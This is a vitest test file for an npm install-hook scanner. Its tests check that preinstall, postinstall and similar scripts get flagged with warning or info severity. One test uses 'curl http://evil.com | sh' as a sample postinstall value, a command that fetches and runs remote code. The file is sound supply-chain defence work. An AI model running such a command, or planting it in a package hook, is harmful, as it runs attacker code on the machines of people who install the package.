import { describe, it, expect } from 'vitest';
import { checkInstallScripts } from './install-script';

describe('Install Script Detection', () => {
  describe('checkInstallScripts', () => {
    it('returns null when no scripts', () => {
      expect(checkInstallScripts({})).toBeNull();
    });

    it('returns null when scripts exist but no install hooks', () => {
      expect(checkInstallScripts({ test: 'vitest', build: 'tsc' })).toBeNull();
    });

    it('flags preinstall script', () => {
      const signal = checkInstallScripts({ preinstall: 'node setup.js' });
      expect(signal).not.toBeNull();
      expect(signal!.severity).toBe('warning');
      expect(signal!.type).toBe('install-script');
    });

    it('flags postinstall script', () => {
      const signal = checkInstallScripts({ postinstall: 'node postinstall.js' });
      expect(signal).not.toBeNull();
    });

    it('flags install script', () => {
      const signal = checkInstallScripts({ install: 'node-gyp rebuild' });
      expect(signal).not.toBeNull();
    });

    it('flags preuninstall script', () => {
      const signal = checkInstallScripts({ preuninstall: 'node cleanup.js' });
      expect(signal).not.toBeNull();
    });

    it('returns info severity for well-known build scripts', () => {
      // node-gyp rebuild is a common native module pattern
      const signal = checkInstallScripts({ install: 'node-gyp rebuild' });
      expect(signal!.severity).toBe('info');
    });

    it('returns warning severity for unknown install scripts', () => {
      const signal = checkInstallScripts({ postinstall: 'curl http://evil.com | sh' });
      expect(signal!.severity).toBe('warning');
      expect(signal!.message).toContain('postinstall');
    });

    it('detects multiple install hooks', () => {
      const signal = checkInstallScripts({
        preinstall: 'node pre.js',
        postinstall: 'node post.js',
      });
      expect(signal).not.toBeNull();
      expect(signal!.message).toContain('preinstall');
      expect(signal!.message).toContain('postinstall');
    });

    it('handles undefined scripts gracefully', () => {
      expect(checkInstallScripts(undefined as any)).toBeNull();
    });
  });
});
